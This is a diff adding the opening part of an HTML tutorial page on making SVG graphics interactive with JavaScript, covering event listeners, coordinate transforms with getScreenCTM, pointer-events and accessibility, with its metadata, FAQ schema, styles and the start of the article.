@@ -1,0 +1,1687 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>How to Create Interactive SVG with JavaScript: The Complete Event Handling &amp; DOM Guide</title>
+  <meta name="description" content="Master interactive SVG with JavaScript: DOM event listeners, matrix transforms with getScreenCTM, pointer-events, drag-and-drop, and live sandbox.">
+  <meta name="keywords" content="interactive svg, svg onclick javascript, svg event listener, how to make svg interactive, interactive svg map javascript, svg pointer events, svg getScreenCTM, svg createSVGPoint">
+  <meta property="og:title" content="How to Create Interactive SVG with JavaScript: The Complete Event Handling &amp; DOM Guide">
+  <meta property="og:description" content="Master interactive SVG with JavaScript: DOM event listeners, matrix transforms with getScreenCTM, pointer-events, drag-and-drop, and live sandbox.">
+  <meta property="og:type" content="article">
+  <meta property="og:url" content="https://iconstash.io/articles/how-to-create-interactive-svg-with-javascript-guide/">
+  <meta property="og:image" content="https://iconstash.io/assets/articles/how-to-create-interactive-svg-with-javascript-guide.jpg">
+  <meta property="og:image:width" content="1200">
+  <meta property="og:image:height" content="675">
+  <meta property="og:site_name" content="IconStash">
+  <meta property="article:published_time" content="2026-10-29T00:00:00Z">
+  <meta property="article:modified_time" content="2026-10-29T00:00:00Z">
+  <meta property="article:author" content="Jouni Flemming">
+  <meta property="article:section" content="SVG Scripting &amp; Interaction">
+  <meta property="article:tag" content="SVG">
+  <meta property="article:tag" content="JavaScript">
+  <meta property="article:tag" content="Frontend Engineering">
+  <meta property="article:tag" content="DOM Manipulation">
+  <meta property="article:tag" content="Interactive Design">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="How to Create Interactive SVG with JavaScript: The Complete Event Handling &amp; DOM Guide">
+  <meta name="twitter:description" content="Master interactive SVG with JavaScript: DOM event listeners, matrix transforms with getScreenCTM, pointer-events, drag-and-drop, and live sandbox.">
+  <meta name="twitter:image" content="https://iconstash.io/assets/articles/how-to-create-interactive-svg-with-javascript-guide.jpg">
+  <link rel="canonical" href="https://iconstash.io/articles/how-to-create-interactive-svg-with-javascript-guide/">
+  <link rel="icon" type="image/svg+xml" href="/favicon.svg">
+  <link rel="apple-touch-icon" href="/favicon.jpeg">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+  <script type="application/ld+json">
+  [
+    {
+      "@context": "https://schema.org",
+      "@type": "TechArticle",
+      "headline": "How to Create Interactive SVG with JavaScript: The Complete Event Handling & DOM Guide",
+      "description": "Master interactive SVG with JavaScript: DOM event listeners, matrix transforms with getScreenCTM, pointer-events, drag-and-drop, and live sandbox.",
+      "image": "https://iconstash.io/assets/articles/how-to-create-interactive-svg-with-javascript-guide.jpg",
+      "author": {
+        "@type": "Person",
+        "name": "Jouni Flemming",
+        "url": "https://iconstash.io/about/",
+        "worksFor": {
+          "@type": "Organization",
+          "name": "Great Software Company",
+          "url": "https://greatsoftwarecompany.com"
+        }
+      },
+      "publisher": {
+        "@type": "Organization",
+        "name": "IconStash",
+        "url": "https://iconstash.io",
+        "logo": {
+          "@type": "ImageObject",
+          "url": "https://iconstash.io/logo.png"
+        },
+        "parentOrganization": {
+          "@type": "Organization",
+          "name": "Great Software Company",
+          "url": "https://greatsoftwarecompany.com"
+        }
+      },
+      "datePublished": "2026-10-29",
+      "dateModified": "2026-10-29",
+      "mainEntityOfPage": "https://iconstash.io/articles/how-to-create-interactive-svg-with-javascript-guide/",
+      "isPartOf": {
+        "@type": "WebSite",
+        "@id": "https://iconstash.io/#website"
+      },
+      "inLanguage": "en-US",
+      "wordCount": 5680,
+      "articleSection": "SVG Scripting & Interaction",
+      "proficiencyLevel": "Intermediate to Advanced",
+      "keywords": ["interactive svg", "svg onclick javascript", "svg event listener", "how to make svg interactive", "interactive svg map javascript", "svg pointer events", "svg getScreenCTM", "svg createSVGPoint"]
+    },
+    {
+      "@context": "https://schema.org",
+      "@type": "BreadcrumbList",
+      "itemListElement": [
+        {
+          "@type": "ListItem",
+          "position": 1,
+          "name": "IconStash",
+          "item": "https://iconstash.io/"
+        },
+        {
+          "@type": "ListItem",
+          "position": 2,
+          "name": "Articles",
+          "item": "https://iconstash.io/articles/"
+        },
+        {
+          "@type": "ListItem",
+          "position": 3,
+          "name": "Interactive SVG with JavaScript Guide",
+          "item": "https://iconstash.io/articles/how-to-create-interactive-svg-with-javascript-guide/"
+        }
+      ]
+    },
+    {
+      "@context": "https://schema.org",
+      "@type": "FAQPage",
+      "mainEntity": [
+        {
+          "@type": "Question",
+          "name": "Why do standard MouseEvent clientX and clientY fail when positioning elements inside an SVG?",
+          "acceptedAnswer": {
+            "@type": "Answer",
+            "text": "MouseEvent clientX and clientY report pixel coordinates relative to the browser client viewport. SVG elements, however, render inside an internal user coordinate space defined by the viewBox attribute and current scale factors. When an SVG is scaled, rotated, centered, or preserves aspect ratio, client pixels do not correspond 1:1 with SVG internal units. To convert screen pixels to exact SVG viewBox coordinates, developers must invert the SVG current transformation matrix using svgElement.getScreenCTM().inverse() and multiply it by a DOMPoint initialized with clientX and clientY."
+          }
+        },
+        {
+          "@type": "Question",
+          "name": "What is the modern replacement for svg.createSVGPoint() in modern web browsers?",
+          "acceptedAnswer": {
+            "@type": "Answer",
+            "text": "In modern browsers conforming to the SVG2 and Geometry Interfaces specifications, new DOMPoint(clientX, clientY) replaces the legacy document.createElementNS or svg.createSVGPoint() API. Calling point.matrixTransform(svg.getScreenCTM().inverse()) transforms the coordinates directly into the local SVG coordinate system across Chrome, Edge, Firefox, and Safari without deprecation warnings."
+          }
+        },
+        {
+          "@type": "Question",
+          "name": "How does pointer-events: visiblePainted differ from pointer-events: all in SVG?",
+          "acceptedAnswer": {
+            "@type": "Answer",
+            "text": "pointer-events: visiblePainted triggers hit-testing only on parts of an element that have an explicit fill or stroke painted and whose visibility property is not set to hidden. Conversely, pointer-events: all captures pointer hits across the entire geometric interior and stroke boundary regardless of whether fill or stroke are set to none, or visibility is set to hidden. This makes pointer-events: all ideal for creating invisible hit targets around delicate thin line icons."
+          }
+        },
+        {
+          "@type": "Question",
+          "name": "Can you attach JavaScript event listeners to an SVG loaded inside an <img> tag?",
+          "acceptedAnswer": {
+            "@type": "Answer",
+            "text": "No. When an SVG is embedded using an HTML <img> tag or a CSS background-image property, the browser loads the vector asset in a secure, isolated image document context where all script execution, external resource loading, and cross-document DOM manipulation are permanently disabled for security reasons. To bind JavaScript event listeners, you must embed the SVG inline in HTML, load it via an <object> element on the same domain, or fetch and inline the raw XML into the DOM."
+          }
+        },
+        {
+          "@type": "Question",
+          "name": "How do you make interactive SVG shapes accessible to keyboard users and screen readers?",
+          "acceptedAnswer": {
+            "@type": "Answer",
+            "text": "To make an interactive SVG element accessible, add tabindex='0' to allow keyboard focus, assign role='button' or role='link' depending on semantic intent, and provide an explicit aria-label or link an internal <title> element via aria-labelledby. Furthermore, listen for keydown events for Enter (key code 13) and Space (key code 32) in addition to pointer events, and ensure visual focus states are visible using CSS :focus-visible outlines."
+          }
+        },
+        {
+          "@type": "Question",
+          "name": "How do you prevent SVG dragging and gesture conflicts on mobile touchscreen devices?",
+          "acceptedAnswer": {
+            "@type": "Answer",
+            "text": "Apply the CSS property touch-action: none to the interactive SVG container to prevent default mobile browser gestures such as pinch-to-zoom and page scrolling. In JavaScript, utilize modern Pointer Events (pointerdown, pointermove, pointerup) instead of touch events, and invoke event.target.setPointerCapture(event.pointerId) upon pointerdown so that drag events continue tracking reliably even when the finger strays outside the SVG element boundaries."
+          }
+        }
+      ]
+    }
+  ]
+  </script>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    html { scroll-behavior: smooth; -webkit-text-size-adjust: 100%; }
+    body { background: #0A0A0A; color: #F2F2F2; font: 400 17px/1.8 "Inter", system-ui, -apple-system, sans-serif; -webkit-font-smoothing: antialiased; }
+    a { color: #C1DD2D; text-decoration: none; transition: color 150ms ease; }
+    a:hover { color: #D2ED3E; }
+    ::selection { background: rgba(193,221,45,0.25); color: #fff; }
+    svg { max-width: 100%; display: inline-block; vertical-align: middle; }
+
+    .site-header { position: sticky; top: 0; z-index: 100; background: rgba(10,10,10,0.88); backdrop-filter: blur(20px); -webkit-backdrop-filter: blur(20px); border-bottom: 1px solid #1F1F1F; padding: 0 24px; height: 58px; display: flex; align-items: center; justify-content: space-between; }
+    .site-header .logo { display: flex; align-items: center; gap: 10px; font-weight: 800; font-size: 18px; color: #F2F2F2; }
+    .site-header .logo svg { width: 24px; height: 24px; color: #C1DD2D; }
+    .site-header nav { display: flex; gap: 24px; align-items: center; }
+    .site-header nav a { color: #888; font-size: 14px; font-weight: 500; }
+    .site-header nav a:hover { color: #F2F2F2; }
+    .header-cta { background: #C1DD2D; color: #0A0A0A; font-weight: 700; font-size: 13px; padding: 8px 18px; border-radius: 6px; border: none; cursor: pointer; transition: all 150ms ease; }
+    .header-cta:hover { background: #D2ED3E; transform: translateY(-1px); }
+    .theme-toggle-btn { background: transparent; border: 1px solid #262626; color: #A3A3A3; width: 34px; height: 34px; border-radius: 6px; display: flex; align-items: center; justify-content: center; cursor: pointer; transition: all 150ms ease; }
+    .theme-toggle-btn:hover { border-color: #404040; color: #F2F2F2; }
+
+    .page-container { max-width: 1280px; margin: 0 auto; padding: 48px 24px 80px; width: 100%; }
+    .breadcrumb { display: flex; gap: 8px; font-size: 13px; color: #666; margin-bottom: 24px; align-items: center; flex-wrap: wrap; }
+    .breadcrumb a { color: #888; }
+    .breadcrumb a:hover { color: #C1DD2D; }
+    .breadcrumb .sep { color: #444; }
+
+    .article-hero { margin-bottom: 36px; border-bottom: 1px solid #1F1F1F; padding-bottom: 32px; }
+    .article-hero .tag { display: inline-block; background: rgba(193,221,45,0.12); color: #C1DD2D; font-size: 12px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.8px; padding: 4px 12px; border-radius: 4px; margin-bottom: 16px; border: 1px solid rgba(193,221,45,0.25); }
+    .article-hero h1 { font-size: clamp(28px, 4vw, 42px); font-weight: 900; line-height: 1.18; color: #FFF; letter-spacing: -0.03em; margin-bottom: 16px; }
+    .article-meta { display: flex; gap: 20px; font-size: 13px; color: #737373; align-items: center; flex-wrap: wrap; margin-top: 12px; }
+    .article-meta a { color: #C1DD2D; font-weight: 600; text-decoration: none; }
+
+    .article-layout { display: grid; grid-template-columns: minmax(0, 1fr); gap: 48px; align-items: start; }
+    @media (min-width: 1024px) {
+      .article-layout { grid-template-columns: minmax(0, 1fr) 320px; }
+    }
+
+    .article-main { min-width: 0; }
+    .featured-summary { background: linear-gradient(180deg, #141414 0%, #0E0E0E 100%); border: 1px solid #262626; border-left: 4px solid #C1DD2D; border-radius: 10px; padding: 24px 28px; margin-bottom: 32px; }
+    .featured-summary p { font-size: 15.5px; line-height: 1.7; color: #E5E5E5; margin-bottom: 12px; font-weight: 500; }
+    .featured-summary ul { margin: 0 0 0 20px; color: #D4D4D4; }
+    .featured-summary li { margin-bottom: 8px; font-size: 14.5px; line-height: 1.6; }
+
+    .article-figure { margin: 28px 0 36px; padding: 0; display: block; }
+    .article-figure img { width: 100%; max-width: 100%; height: auto; border-radius: 10px; display: block; border: 1px solid #262626; }
+    .article-figure figcaption { font-size: 0.85em; color: #737373; text-align: center; margin-top: 10px; font-style: italic; }
+
+    h2 { font-size: 26px; font-weight: 800; color: #FFF; letter-spacing: -0.02em; margin: 48px 0 20px; padding-top: 24px; border-top: 1px solid #1F1F1F; }
+    h3 { font-size: 20px; font-weight: 700; color: #E5E5E5; margin: 32px 0 14px; }
+    h4 { font-size: 17px; font-weight: 700; color: #DDD; margin: 24px 0 10px; }
+    p { margin-bottom: 22px; color: #D4D4D4; font-size: 16px; line-height: 1.8; }
+    strong { color: #FFF; }
+    ul, ol { margin: 0 0 24px 28px; color: #D4D4D4; }
+    li { margin-bottom: 10px; line-height: 1.7; font-size: 15.5px; }
+
+    pre { background: #121212; border: 1px solid #222; border-radius: 8px; padding: 20px; overflow-x: auto; margin: 24px 0; font-family: "JetBrains Mono", monospace; font-size: 13.5px; line-height: 1.6; color: #E5E5E5; }
+    code { font-family: "JetBrains Mono", monospace; font-size: 0.9em; background: #1A1A1A; padding: 2px 6px; border-radius: 4px; color: #C1DD2D; }
+
+    /* Tables */
+    .table-container { overflow-x: auto; margin: 32px 0; border: 1px solid #222; border-radius: 12px; -webkit-overflow-scrolling: touch; }
+    table { width: 100%; min-width: 640px; border-collapse: collapse; text-align: left; font-size: 14.5px; }
+    th { background: #161616; color: #FFF; padding: 14px 18px; font-weight: 700; border-bottom: 1px solid #222; }
+    td { padding: 14px 18px; border-bottom: 1px solid #1A1A1A; color: #CCC; }
+    tr:last-child td { border-bottom: none; }
+    tr:nth-child(even) { background: rgba(255,255,255,0.01); }
+
+    /* Interactive Studio */
+    .interactive-sandbox { background: #121212; border: 1px solid #262626; border-radius: 12px; padding: 24px; margin: 36px 0; }
+    .sandbox-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; flex-wrap: wrap; gap: 12px; border-bottom: 1px solid #222; padding-bottom: 14px; }
+    .sandbox-title { display: flex; align-items: center; gap: 8px; font-weight: 800; font-size: 16px; color: #FFF; }
+    .sandbox-title svg { color: #C1DD2D; }
+    .sandbox-badge { font-size: 11px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.05em; background: rgba(193,221,45,0.12); color: #C1DD2D; padding: 3px 8px; border-radius: 4px; border: 1px solid rgba(193,221,45,0.25); }
+
+    .sandbox-grid { display: grid; grid-template-columns: minmax(0, 1.1fr) minmax(0, 1fr); gap: 24px; align-items: start; }
+    @media (max-width: 768px) { .sandbox-grid { grid-template-columns: 1fr; } }
+
+    .sandbox-controls { display: flex; flex-direction: column; gap: 16px; }
+    .control-row { display: flex; flex-direction: column; gap: 6px; }
+    .control-row label { font-size: 13px; font-weight: 600; color: #BBB; display: flex; justify-content: space-between; }
+    .control-row .stat-num { color: #C1DD2D; font-family: "JetBrains Mono", monospace; }
+
+    .preset-chips { display: flex; gap: 8px; flex-wrap: wrap; margin-bottom: 8px; }
+    .preset-chip { background: #1A1A1A; border: 1px solid #333; color: #CCC; font-size: 12px; padding: 6px 12px; border-radius: 6px; cursor: pointer; transition: all 120ms ease; }
+    .preset-chip:hover { border-color: #C1DD2D; color: #FFF; }
+    .preset-chip.active { background: rgba(193,221,45,0.15); border-color: #C1DD2D; color: #C1DD2D; font-weight: 700; }
+
+    .stage-wrapper { display: flex; flex-direction: column; gap: 14px; }
+    .preview-stage-container { width: 100%; height: 280px; border: 1px dashed #444; border-radius: 10px; background: #0E0E0E; display: flex; align-items: center; justify-content: center; position: relative; overflow: hidden; }
+    .stage-viewport-box { position: relative; width: 100%; height: 100%; overflow: hidden; background: radial-gradient(circle at center, #191E0D 0%, #0C0F05 100%); border: 2px solid #C1DD2D; border-radius: 8px; display: flex; align-items: center; justify-content: center; touch-action: none; cursor: crosshair; }
+    .stage-svg-element { width: 100%; height: 100%; display: block; user-select: none; }
+    .viewport-meta-overlay { position: absolute; bottom: 8px; right: 10px; font-size: 11px; font-family: "JetBrains Mono", monospace; color: #888; background: rgba(0,0,0,0.8); padding: 3px 8px; border-radius: 4px; pointer-events: none; border: 1px solid #222; }
+
+    .stroke-stats-box { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; background: #0E0E0E; border: 1px solid #222; border-radius: 8px; padding: 12px; }
+    .stat-item { text-align: center; }
+    .stat-label { font-size: 11px; text-transform: uppercase; color: #777; font-weight: 700; letter-spacing: 0.05em; }
+    .stat-val { font-size: 13.5px; font-weight: 800; color: #FFF; font-family: "JetBrains Mono", monospace; margin-top: 2px; }
+    .stat-val.highlight { color: #C1DD2D; }
+
+    .event-log-container { background: #0A0A0A; border: 1px solid #262626; border-radius: 8px; padding: 12px; max-height: 140px; overflow-y: auto; font-family: "JetBrains Mono", monospace; font-size: 11.5px; color: #A3A3A3; display: flex; flex-direction: column-reverse; gap: 4px; }
+    .log-line { display: flex; gap: 8px; padding: 2px 0; border-bottom: 1px solid #161616; }
+    .log-time { color: #666; }
+    .log-type { color: #C1DD2D; font-weight: 700; }
+    .log-target { color: #60A5FA; }
+    .log-coords { color: #F59E0B; }
+
+    .generated-code-box { margin-top: 20px; background: #0A0A0A; border: 1px solid #262626; border-radius: 8px; overflow: hidden; }
+    .code-box-head { display: flex; justify-content: space-between; align-items: center; padding: 10px 14px; background: #161616; border-bottom: 1px solid #222; font-size: 12px; font-weight: 700; color: #888; flex-wrap: wrap; gap: 8px; }
+    .code-tabs { display: flex; gap: 6px; }
+    .code-tab-btn { background: transparent; border: none; color: #888; font-size: 12px; font-weight: 700; cursor: pointer; padding: 4px 8px; border-radius: 4px; }
+    .code-tab-btn.active { color: #C1DD2D; background: rgba(193,221,45,0.12); }
+    .code-actions { display: flex; gap: 8px; }
+    .copy-btn { background: rgba(193,221,45,0.15); border: 1px solid rgba(193,221,45,0.3); color: #C1DD2D; font-size: 11px; font-weight: 700; padding: 5px 12px; border-radius: 4px; cursor: pointer; transition: all 120ms ease; }
+    .copy-btn:hover { background: #C1DD2D; color: #0A0A0A; }
+    .code-output-area { padding: 16px; max-height: 180px; overflow-y: auto; font-family: "JetBrains Mono", monospace; font-size: 12px; line-height: 1.5; color: #E5E5E5; word-break: break-all; white-space: pre-wrap; background: #080808; margin: 0; border: none; }
+
+    /* Formula Cards & Callouts */
+    .formula-card { background: #161616; border: 1px solid #2E2E2E; border-left: 3px solid #C1DD2D; border-radius: 8px; padding: 16px 20px; margin: 20px 0; overflow-x: auto; -webkit-overflow-scrolling: touch; }
+    .formula-title { font-size: 12px; text-transform: uppercase; letter-spacing: 0.06em; color: #888; font-weight: 700; margin-bottom: 6px; }
+    .formula-body { font-family: "JetBrains Mono", monospace; font-size: 14px; color: #C1DD2D; line-height: 1.5; overflow-x: auto; -webkit-overflow-scrolling: touch; }
+    .formula-desc { font-size: 13.5px; color: #AAA; margin-top: 8px; line-height: 1.5; }
+
+    .takeaway-box { background: linear-gradient(135deg, rgba(193,221,45,0.06) 0%, rgba(193,221,45,0.02) 100%); border: 1px solid rgba(193,221,45,0.2); border-radius: 12px; padding: 28px; margin: 40px 0; }
+    .takeaway-box h3 { color: #C1DD2D; font-size: 18px; font-weight: 800; margin-bottom: 16px; margin-top: 0; }
+    .warning-box { background: rgba(239, 68, 68, 0.08); border: 1px solid rgba(239, 68, 68, 0.25); border-left: 4px solid #EF4444; border-radius: 8px; padding: 18px 22px; margin: 24px 0; }
+    .warning-box h4 { color: #F87171; font-size: 15px; margin-bottom: 8px; }
+    .warning-box p { color: #E5E5E5; margin-bottom: 0; font-size: 14.5px; }
+
+    .faq-item { background: #121212; border: 1px solid #222; border-radius: 8px; margin-bottom: 14px; padding: 18px 22px; }
+    .faq-item h3 { margin-top: 0; font-size: 16px; color: #FFF; margin-bottom: 8px; }
+    .faq-item p { margin-bottom: 0; color: #A3A3A3; font-size: 14.5px; }
+
+    /* Sticky Sidebar */
+    .article-sidebar { display: flex; flex-direction: column; gap: 24px; }
+    @media (min-width: 1024px) {
+      .article-sidebar { position: sticky; top: 80px; }
+    }
+    .sidebar-card { background: #121212; border: 1px solid #222; border-radius: 12px; padding: 24px; }
+    .sidebar-title { font-size: 13px; font-weight: 800; text-transform: uppercase; letter-spacing: 0.08em; color: #888; margin-bottom: 16px; }
+    .toc-nav ol { list-style: none; margin: 0; padding: 0; }
+    .toc-nav li { margin-bottom: 10px; font-size: 14px; }
+    .toc-nav a { color: #A3A3A3; display: block; line-height: 1.5; }
+    .toc-nav a:hover { color: #C1DD2D; }
+
+    .cta-sidebar-box { background: linear-gradient(145deg, #181E07 0%, #0F1205 100%); border: 1px solid rgba(193,221,45,0.3); border-radius: 12px; padding: 24px; text-align: center; }
+    .cta-sidebar-box h4 { font-size: 18px; font-weight: 800; color: #FFF; margin-bottom: 8px; }
+    .cta-sidebar-box p { font-size: 13.5px; color: #AAA; line-height: 1.5; margin-bottom: 16px; }
+    .cta-sidebar-btn { display: inline-block; width: 100%; background: #C1DD2D; color: #0A0A0A; font-weight: 800; font-size: 14px; padding: 12px 18px; border-radius: 6px; transition: all 150ms ease; }
+    .cta-sidebar-btn:hover { background: #D2ED3E; transform: translateY(-1px); }
+
+    .site-footer { border-top: 1px solid #1F1F1F; padding: 48px 24px; background: #0A0A0A; text-align: center; font-size: 14px; color: #666; margin-top: 80px; }
+    .site-footer a { color: #888; }
+    .site-footer a:hover { color: #C1DD2D; }
+
+    @media (max-width: 768px) {
+      .page-container { padding: 28px 16px 60px; }
+      .site-header nav a:not(.header-cta) { display: none; }
+      .site-header nav { gap: 12px; }
+      .header-cta { padding: 6px 12px; font-size: 12px; }
+      .article-hero h1 { font-size: 26px; }
+      .featured-summary { padding: 18px 20px; }
+      pre { padding: 14px; font-size: 12.5px; }
+      .stroke-stats-box { grid-template-columns: 1fr; }
+    }
+
+    /* Light Theme Contrast Rules */
+    html[data-theme="light"] body { background: #FAFAFA; color: #171717; }
+    html[data-theme="light"] .site-header { background: rgba(250,250,250,0.88); border-bottom-color: #E5E5E5; }
+    html[data-theme="light"] .site-header .logo { color: #171717; }
+    html[data-theme="light"] .site-header nav a { color: #525252; }
+    html[data-theme="light"] .article-hero h1 { color: #0A0A0A; }
+    html[data-theme="light"] h2 { color: #0A0A0A; border-top-color: #E5E5E5; }
+    html[data-theme="light"] h3 { color: #171717; }
+    html[data-theme="light"] h4 { color: #262626; }
+    html[data-theme="light"] p, html[data-theme="light"] ul, html[data-theme="light"] ol { color: #383838; }
+    html[data-theme="light"] strong { color: #0A0A0A; }
+    html[data-theme="light"] .featured-summary { background: #F4F4F5; border-color: #E4E4E7; border-left-color: #849E00; }
+    html[data-theme="light"] .featured-summary p { color: #18181B; }
+    html[data-theme="light"] pre { background: #F4F4F5; border-color: #E4E4E7; color: #18181B; }
+    html[data-theme="light"] pre code { background: transparent; color: #18181B; }
+    html[data-theme="light"] code { background: #E4E4E7; color: #4D6300; }
+    html[data-theme="light"] a { color: #4D6300; }
+    html[data-theme="light"] a:hover { color: #364600; }
+    html[data-theme="light"] .site-header nav a:hover { color: #0A0A0A; }
+    html[data-theme="light"] .breadcrumb a { color: #4D6300; }
+    html[data-theme="light"] .breadcrumb a:hover { color: #364600; }
+    html[data-theme="light"] .toc-nav a { color: #3F3F46; }
+    html[data-theme="light"] .toc-nav a:hover { color: #4D6300; }
+    html[data-theme="light"] .site-footer a { color: #4D6300; }
+    html[data-theme="light"] .site-footer a:hover { color: #364600; }
+    html[data-theme="light"] .article-hero .tag { background: #E4E4E7; color: #4D6300; border-color: #D4D4D8; }
+    html[data-theme="light"] .site-footer { background: #FAFAFA; border-top-color: #E5E5E5; }
+    html[data-theme="light"] .sidebar-card { background: #F4F4F5; border-color: #E4E4E7; }
+    html[data-theme="light"] .cta-sidebar-box { background: #ECFDF5; border-color: #A7F3D0; }
+    html[data-theme="light"] .cta-sidebar-box h4 { color: #064E3B; }
+    html[data-theme="light"] .cta-sidebar-box p { color: #047857; }
+    html[data-theme="light"] th { background: #F4F4F5; color: #18181B; border-bottom-color: #E4E4E7; }
+    html[data-theme="light"] td { border-bottom-color: #E4E4E7; color: #3F3F46; }
+    html[data-theme="light"] .table-container { border-color: #E4E4E7; }
+    html[data-theme="light"] .interactive-sandbox { background: #F4F4F5; border-color: #E4E4E7; }
+    html[data-theme="light"] .sandbox-header { border-bottom-color: #E4E4E7; }
+    html[data-theme="light"] .sandbox-title { color: #18181B; }
+    html[data-theme="light"] .control-row label { color: #4B5563; }
+    html[data-theme="light"] .preview-stage-container { background: #F9FAFB; border-color: #D1D5DB; }
+    html[data-theme="light"] .stage-viewport-box { background: radial-gradient(circle at center, #F0FDF4 0%, #DCFCE7 100%); border-color: #4D6300; }
+    html[data-theme="light"] .generated-code-box { background: #FAFAFA; border-color: #E4E4E7; }
+    html[data-theme="light"] .code-box-head { background: #F4F4F5; border-bottom-color: #E4E4E7; color: #525252; }
+    html[data-theme="light"] .code-output-area { background: #FFFFFF; color: #1F2937; }
+    html[data-theme="light"] .copy-btn { background: #F0F4D8; border-color: #D2ED3E; color: #4D6300; }
+    html[data-theme="light"] .copy-btn:hover { background: #4D6300; color: #FFF; }
+    html[data-theme="light"] .stroke-stats-box { background: #F4F4F5; border-color: #E4E4E7; }
+    html[data-theme="light"] .stat-val { color: #18181B; }
+    html[data-theme="light"] .stat-val.highlight { color: #4D6300; }
+    html[data-theme="light"] .sandbox-badge { background: #E4E4E7; color: #4D6300; border-color: #D4D4D8; }
+    html[data-theme="light"] .control-row .stat-num { color: #4D6300; }
+    html[data-theme="light"] .preset-chip { background: #FFF; border-color: #D4D4D8; color: #525252; }
+    html[data-theme="light"] .preset-chip:hover { border-color: #4D6300; color: #171717; }
+    html[data-theme="light"] .preset-chip.active { background: #ECFDF5; border-color: #4D6300; color: #4D6300; }
+    html[data-theme="light"] .code-tab-btn.active { color: #4D6300; background: #E4E4E7; }
+    html[data-theme="light"] .takeaway-box { background: #F4F4F5; border-color: #E4E4E7; }
+    html[data-theme="light"] .takeaway-box h3 { color: #4D6300; }
+    html[data-theme="light"] .formula-card { background: #F4F4F5; border-color: #E4E4E7; border-left-color: #4D6300; }
+    html[data-theme="light"] .formula-body { color: #4D6300; }
+    html[data-theme="light"] .formula-desc { color: #525252; }
+    html[data-theme="light"] .faq-item { background: #F4F4F5; border-color: #E4E4E7; }
+    html[data-theme="light"] .faq-item h3 { color: #18181B; }
+    html[data-theme="light"] .faq-item p { color: #525252; }
+    html[data-theme="light"] .article-meta a { color: #4D6300; }
+    html[data-theme="light"] .article-meta { color: #525252; }
+    html[data-theme="light"] .warning-box { background: #FEF2F2; border-color: #FECACA; border-left-color: #DC2626; }
+    html[data-theme="light"] .warning-box h4 { color: #991B1B; }
+    html[data-theme="light"] .warning-box p { color: #1F2937; }
+    html[data-theme="light"] .sidebar-title { color: #525252; }
+    html[data-theme="light"] .formula-title { color: #525252; }
+    html[data-theme="light"] .stat-label { color: #525252; }
+    html[data-theme="light"] .breadcrumb { color: #525252; }
+    html[data-theme="light"] .event-log-container { background: #FFFFFF; border-color: #E4E4E7; color: #374151; }
+    html[data-theme="light"] .log-line { border-bottom-color: #F3F4F6; }
+    html[data-theme="light"] .log-time { color: #9CA3AF; }
+    html[data-theme="light"] .log-type { color: #4D6300; }
+  </style>
+</head>
+<body>
+
+<header class="site-header">
+  <a href="/" class="logo" aria-label="IconStash.io home">
+    <svg viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2 21 7v10l-9 5-9-5V7l9-5Z"/><path d="m8 9 4-2 4 2v6l-4 2-4-2V9Z"/></svg>
+    <span>IconStash</span>
+  </a>
+  <nav>
+    <a href="/#/">Search 134K+ Icons</a>
+    <a href="/articles/">Articles &amp; Guides</a>
+    <a href="/Listicles/best-free-icon-sets-2026/">Best Sets</a>
+    <a href="/Glossary/icon-svg-terminology/">Glossary</a>
+    <a href="/stats/">Statistics</a>
+    <button class="theme-toggle-btn" id="themeToggle" aria-label="Toggle theme">
+      <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><path d="M12 1v2M12 21v2M4.22 4.22l1.42 1.42M18.36 18.36l1.42 1.42M1 12h2M21 12h2M4.22 19.78l1.42-1.42M18.36 5.64l1.42-1.42"/></svg>
+    </button>
+    <a href="/#/" class="header-cta">Browse 134K+ Icons</a>
+  </nav>
+</header>
+
+<div class="page-container">
+  <div class="breadcrumb">
+    <a href="/">Home</a>
+    <span class="sep">/</span>
+    <a href="/articles/">Articles</a>
+    <span class="sep">/</span>
+    <span>Interactive SVG with JavaScript</span>
+  </div>
+
+  <article class="article-hero">
+    <span class="tag">SVG Scripting &amp; Interaction</span>
+    <h1>How to Create Interactive SVG with JavaScript: The Complete Event Handling &amp; DOM Guide</h1>
+    <div class="article-meta">
+      <span>By <a href="/about/">Jouni Flemming</a></span>
+      <span>Published October 29, 2026</span>
+      <span>Reading Time: 25 min</span>
+      <span>134,701 Free SVG Icons on IconStash</span>
+    </div>
+  </article>
+
+  <div class="article-layout">
+    <main class="article-main">
+
+      <div class="featured-summary">
+        <p><strong>Executive Architectural Takeaway:</strong> Unlike static raster images or black-box HTML5 Canvas bitmaps, Scalable Vector Graphics (SVG) elements are first-class citizens of the Document Object Model (DOM). Every path, circle, polygon, and group in an inline SVG can listen to user interactions, manipulate vector attributes dynamically, and participate in complex event cascades.</p>
+        <ul>
+          <li><strong>DOM Event Delegation:</strong> Harness standard event bubbling on root <code>&lt;svg&gt;</code> elements to manage thousands of interactive nodes with minimal memory overhead.</li>
+          <li><strong>The Coordinate Inversion Problem:</strong> Transform screen-space client coordinates (<code>clientX</code>, <code>clientY</code>) into arbitrary SVG viewBox coordinates using <code>getScreenCTM().inverse()</code> and modern <code>DOMPoint</code> arithmetic.</li>
+          <li><strong>Hit-Testing Control:</strong> Fine-tune optical responsiveness using <code>pointer-events</code> properties (<code>visiblePainted</code>, <code>all</code>, <code>fill</code>, <code>stroke</code>) to eliminate micro-interaction dead zones.</li>
+          <li><strong>Universal Accessibility:</strong> Implement robust keyboard navigation, ARIA semantics (<code>role="button"</code>, <code>aria-label</code>), focus management, and touch gesture safety across mobile browsers.</li>
+        </ul>
+      </div>
+
+      <figure class="article-figure">
